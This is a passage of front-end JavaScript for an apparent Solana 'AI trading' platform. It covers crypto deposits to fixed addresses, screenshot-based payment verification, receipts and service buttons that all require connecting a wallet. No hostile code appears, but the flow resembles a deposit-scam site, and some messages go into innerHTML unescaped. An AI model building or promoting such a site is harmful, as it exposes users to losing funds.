                formattedMessage = `<span style="color: var(--solana-green); font-weight: 700;">${message}</span>`;
            }
            
            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${formattedMessage}`;
            
            logContent.appendChild(logEntry);
            
            // Limit log entries
            if (logContent.children.length > 20) {
                logContent.removeChild(logContent.children[0]);
            }
            
            // Scroll to bottom
            logContent.scrollTop = logContent.scrollHeight;
        }
        
        updateTradeLog() {
            const logContent = document.getElementById('tradingLogContent');
            if (!logContent) return;
            
            if (this.tradeLog.length === 0) {
                logContent.innerHTML = `
                    <div class="log-entry">
                        <span class="log-timestamp">[${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span>
                        <span>AI bot ready. Click "Start Watching" to begin.</span>
                    </div>
                `;
            }
        }
        
        // Crypto selection methods
        selectCrypto(crypto) {
            this.selectedCrypto = crypto;
            
            // Update UI
            document.querySelectorAll('.crypto-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            const selected = document.querySelector(`.crypto-option[data-crypto="${crypto}"]`);
            if (selected) selected.classList.add('selected');
            
            // Update address and warning
            const address = this.cryptoAddresses[crypto];
            const addressEl = document.getElementById('cryptoAddress');
            const warningEl = document.getElementById('cryptoWarning');
            
            if (addressEl) addressEl.textContent = address;
            if (warningEl) {
                const cryptoName = crypto.toUpperCase();
                warningEl.textContent = `Send only ${cryptoName} to this address. Sending other cryptocurrencies may result in permanent loss.`;
            }
            
            this.updateCryptoAmount();
            this.updatePurchaseDetails();
            this.updateConfirmButton();
        }
        
        updateCryptoAmount() {
            const amountInput = document.getElementById('depositAmount');
            if (!amountInput) return;
            
            const amount = parseFloat(amountInput.value) || 0;
            const crypto = this.selectedCrypto;
            const rate = this.cryptoPrices[crypto] || 1;
            const cryptoAmount = amount / rate;
            const cryptoName = crypto.toUpperCase();
            
            const cryptoAmountEl = document.getElementById('cryptoAmount');
            if (cryptoAmountEl) {
                cryptoAmountEl.textContent = `≈ ${cryptoAmount.toFixed(6)} ${cryptoName}`;
            }
        }
        
        updatePurchaseDetails() {
            const amount = parseFloat(document.getElementById('depositAmount')?.value) || 0;
            const crypto = this.selectedCrypto;
            
            if (amount > 0 && this.cryptoPrices[crypto]) {
                const coinAmount = amount / this.cryptoPrices[crypto];
                const cryptoName = crypto.toUpperCase();
                const cryptoAmountEl = document.getElementById('cryptoAmount');
                
                if (cryptoAmountEl) {
                    cryptoAmountEl.innerHTML = 
                        `≈ ${coinAmount.toFixed(6)} ${cryptoName} <span style="color: var(--success); font-size: 12px;">(Purchase)</span>`;
                }
            }
        }
        
        updateConfirmButton() {
            const confirmBtn = document.getElementById('confirmPurchaseBtn');
            if (!confirmBtn) return;
            
            const crypto = this.selectedCrypto;
            const cryptoName = crypto.toUpperCase();
            confirmBtn.innerHTML = `<i class="fas fa-shopping-cart"></i> Confirm ${cryptoName} Purchase`;
        }
    }

    // Global Functions
    window.togglePassword = function(inputId) {
        const input = document.getElementById(inputId);
        if (!input) return;
        
        const toggle = event.currentTarget;
        if (input.type === 'password') {
            input.type = 'text';
            toggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
        } else {
            input.type = 'password';
            toggle.innerHTML = '<i class="fas fa-eye"></i>';
        }
    };

    window.switchToTab = function(tabName) {
        if (window.auth) {
            window.auth.switchTab(tabName);
        }
    };

    window.openForgotPassword = function() {
        if (window.auth) {
            window.auth.openForgotPassword();
        }
    };

    window.handleForgotPassword = function() {
        if (window.auth) {
            window.auth.handleForgotPassword();
        }
    };

    // window.logout = function() {
    //     if (window.auth) {
    //         window.auth.logout();
    //     }
    // };

    window.logout = function() {
    // ========= ADD THESE LINES =========
    // Clear ALL persisted connection state
    localStorage.removeItem('wallet_connected');
    localStorage.removeItem('purchase_verified');
    console.log('🧹 Cleared all wallet connection persistence');
    // ===================================
    
    if (window.auth) {
        window.auth.logout();
    }
};

    window.showTerms = function() {
        const modalOverlay = document.getElementById('modalOverlay');
        const modalContent = document.getElementById('modalContent');
        
        if (modalOverlay && modalContent) {
            modalContent.innerHTML = `
                <h2>Terms of Service</h2>
                <div class="modal-dialog-content">
                    <h3>1. Acceptance of Terms</h3>
                    <p>By accessing and using Solana DApps Enterprise, you accept and agree to be bound by these Terms of Service.</p>
                    
                    <h3>2. Platform Services</h3>
                    <p>We provide a platform for Solana wallet management, token purchasing, and automated trading simulation.</p>
                    
                    <h3>3. User Responsibilities</h3>
                    <ul>
                        <li>You are responsible for maintaining the confidentiality of your credentials</li>
                        <li>You agree to use the platform for lawful purposes only</li>
                        <li>You must be at least 18 years old to use our services</li>
                    </ul>
                    
                    <h3>4. Risk Disclaimer</h3>
                    <p>Cryptocurrency trading involves substantial risk. Past performance is not indicative of future results.</p>
                    
                    <h3>5. Limitation of Liability</h3>
                    <p>We are not liable for any losses or damages arising from the use of our platform.</p>
                    
                    <h3>6. Changes to Terms</h3>
                    <p>We reserve the right to modify these terms at any time. Continued use constitutes acceptance.</p>
                </div>
            `;
            modalOverlay.style.display = 'flex';
        }
    };

    window.showPrivacy = function() {
        const modalOverlay = document.getElementById('modalOverlay');
        const modalContent = document.getElementById('modalContent');
        
        if (modalOverlay && modalContent) {
            modalContent.innerHTML = `
                <h2>Privacy Policy</h2>
                <div class="modal-dialog-content">
                    <h3>1. Information Collection</h3>
                    <p>We collect information you provide directly, including:</p>
                    <ul>
                        <li>Email address and account credentials</li>
                        <li>Wallet information and transaction data</li>
                        <li>Communication preferences</li>
                    </ul>
                    
                    <h3>2. Use of Information</h3>
                    <p>We use your information to:</p>
                    <ul>
                        <li>Provide and improve our services</li>
                        <li>Process transactions and verify identity</li>
                        <li>Communicate platform updates and security alerts</li>
                    </ul>
                    
                    <h3>3. Data Security</h3>
                    <p>We implement industry-standard security measures including:</p>
                    <ul>
                        <li>End-to-end encryption for sensitive data</li>
                        <li>Regular security audits and updates</li>
                        <li>Secure server infrastructure</li>
                    </ul>
                    
                    <h3>4. Third-Party Services</h3>
                    <p>We may use trusted third-party services for:</p>
                    <ul>
                        <li>Email delivery and communication</li>
                        <li>Analytics and performance monitoring</li>
                        <li>Payment processing and verification</li>
                    </ul>
                    
                    <h3>5. User Rights</h3>
                    <p>You have the right to:</p>
                    <ul>
                        <li>Access your personal information</li>
                        <li>Request correction or deletion of data</li>
                        <li>Opt-out of marketing communications</li>
                    </ul>
                    
                    <h3>6. Contact Information</h3>
                    <p>For privacy-related inquiries, contact our Data Protection Officer at privacy@dappsenterprise.com</p>
                </div>
            `;
            modalOverlay.style.display = 'flex';
        }
    };

    window.closeModal = function() {
        const modalOverlay = document.getElementById('modalOverlay');
        if (modalOverlay) {
            modalOverlay.style.display = 'none';
        }
    };

    // Close modal when clicking outside
    document.addEventListener('click', (e) => {
        const modalOverlay = document.getElementById('modalOverlay');
        if (modalOverlay && e.target === modalOverlay) {
            modalOverlay.style.display = 'none';
        }
    });

    // Escape key to close modal
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            closeModal();
        }
    });

    window.selectPaymentMethod = function(method) {
        const cryptoForm = document.getElementById('cryptoDepositForm');
        if (!cryptoForm) return;
        
        cryptoForm.style.display = 'none';
        if (method === 'crypto') {
            cryptoForm.style.display = 'block';
            setTimeout(() => {
                cryptoForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 100);
        }
    };

    window.selectCrypto = function(crypto) {
        if (window.platform) {
            window.platform.selectCrypto(crypto);
        }
    };

    window.updateCryptoAmount = function() {
        if (window.platform) {
            window.platform.updateCryptoAmount();
        }
    };

    window.updatePurchaseDetails = function() {
        if (window.platform) {
            window.platform.updatePurchaseDetails();
        }
    };

    window.updateConfirmButton = function() {
        if (window.platform) {
            window.platform.updateConfirmButton();
        }
    };

    window.copyAddress = function() {
        const address = document.getElementById('cryptoAddress');
        if (address) {
            navigator.clipboard.writeText(address.textContent).then(() => {
                if (window.platform) {
                    window.platform.showNotification('Solana address copied to clipboard!', 'success');
                }
            }).catch(err => {
                console.error('Failed to copy: ', err);
                if (window.platform) {
                    window.platform.showNotification('Failed to copy address', 'error');
                }
            });
        }
    };

    window.saveQRCode = function() {
        if (window.platform) {
            window.platform.showNotification('QR Code download initiated', 'success');
        }
    };

    window.proceedToVerification = function() {
        const amount = document.getElementById('depositAmount').value;
        if (!amount || parseFloat(amount) < 50) {
            if (window.platform) {
                window.platform.showNotification('Minimum amount is $50.00', 'warning');
            }
            return;
        }
        
        const verificationSection = document.getElementById('paymentVerificationSection');
        if (verificationSection) {
            verificationSection.style.display = 'block';
            setTimeout(() => {
                verificationSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 100);
        }
        
        if (window.platform) {
            window.platform.showNotification('Upload transaction screenshot for verification', 'info');
        }
    };

    window.proceedToWalletConnection = function() {
        closeReceiptModal();
        if (window.platform) {
            window.platform.openModal();
            window.platform.showNotification('Connect your wallet to continue', 'info');
        }
    };

    window.handleScreenshotUpload = function(event) {
        const file = event.target.files[0];
        if (!file) return;
        
        if (!file.type.match('image.*')) {
            if (window.platform) {
                window.platform.showNotification('Please upload an image file', 'error');
            }
            return;
        }
        
        const reader = new FileReader();
        reader.onload = function(e) {
            const preview = document.getElementById('screenshotPreview');
            if (preview) {
                preview.src = e.target.result;
                preview.style.display = 'block';
            }
            
            if (window.platform) {
                window.platform.verifyPayment(e.target.result);
            }
        };
        reader.readAsDataURL(file);
    };

    window.handleVerification = function() {
        if (window.platform) {
            window.platform.handleVerification();
        }
    };

    window.closeReceiptModal = function() {
        const modal = document.getElementById('receiptModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    };

    window.printReceipt = function() {
        const receiptContent = document.getElementById('receiptContent');
        if (!receiptContent) return;
        
        const printContent = receiptContent.innerHTML;
        const printWindow = window.open('', '_blank');
        printWindow.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Solana DApps Enterprise Receipt</title>
                <style>
                    body { font-family: 'Courier New', monospace; padding: 20px; }
                    .receipt-container { max-width: 600px; margin: 0 auto; }
                    @media print {
                        body { padding: 0; }
                    }
                </style>
            </head>
            <body>
                <div class="receipt-container">
                    ${printContent}
                </div>
                <script>
                    window.onload = function() { 
                        window.print(); 
                        setTimeout(() => window.close(), 500);
                    }
                <\/script>
            </body>
            </html>
        `);
        printWindow.document.close();
    };

    window.enterWatchTradingPlatform = function() {
        closeReceiptModal();
        window.location.hash = '#watch-trade';
        if (window.platform) {
            window.platform.checkWatchTradingAccess();
        }
    };

    window.startAutoTrading = function() {
        if (window.platform) {
            window.platform.startAutoTrading();
        }
    };

    window.stopAutoTrading = function() {
        if (window.platform) {
            window.platform.stopAutoTrading();
        }
    };

    // Service modal functions
    window.openTokenClaimModal = () => {
        if (window.platform) {
            window.platform.showNotification('Token Claim: Connect wallet to access', 'info');
        }
    };
    window.openStakingModal = () => {
        if (window.platform) {
            window.platform.showNotification('Staking: Connect wallet to access', 'info');
        }
    };
    window.openSwapModal = () => {
        if (window.platform) {
            window.platform.showNotification('Swap: Connect wallet to access', 'info');
        }
    };
    window.openLiquidityModal = () => {
        if (window.platform) {
            window.platform.showNotification('Liquidity: Connect wallet to access', 'info');
        }
    };
    window.openBridgeModal = () => {
        if (window.platform) {
            window.platform.showNotification('Bridge: Connect wallet to access', 'info');
        }
    };
    window.openFarmingModal = () => {
        if (window.platform) {
            window.platform.showNotification('Farming: Connect wallet to access', 'info');
        }
    };
    window.openAnalyticsModal = () => {
        if (window.platform) {
            window.platform.showNotification('Analytics: Connect wallet to access', 'info');
        }
    };
    window.openVaultModal = () => {
        if (window.platform) {
            window.platform.showNotification('Vault: Connect wallet to access', 'info');
        }
    };